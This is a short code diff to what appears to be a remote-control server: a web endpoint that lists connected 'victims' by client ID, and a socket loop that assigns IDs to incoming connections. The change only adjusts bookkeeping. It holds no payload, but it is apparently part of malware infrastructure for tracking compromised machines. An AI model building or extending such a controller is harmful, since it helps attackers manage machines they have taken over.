@@ -19,8 +19,16 @@ def get_victims():
 
     victims = check_users_connection(victims)
 
+    users = list()
+
+    for victim in victims:
+        users.append({
+            'clientId' : victim.client_id
+        })
+
     return jsonify({
-        'TOTAL SIZE': len(victims)
+        'TOTAL SIZE': len(victims),
+        'USERS' : users         
     })
 
 
@@ -68,7 +76,10 @@ while 'LISTENING':
     conn, addr = sock.accept()
     victims = check_users_connection(victims)
 
-    client_id = len(victims) + 1
+    client_id = 1
+
+    if victims:
+        client_id = victims[-1].client_id + 1
 
     logger.info('CONNECTED: ', addr)
 
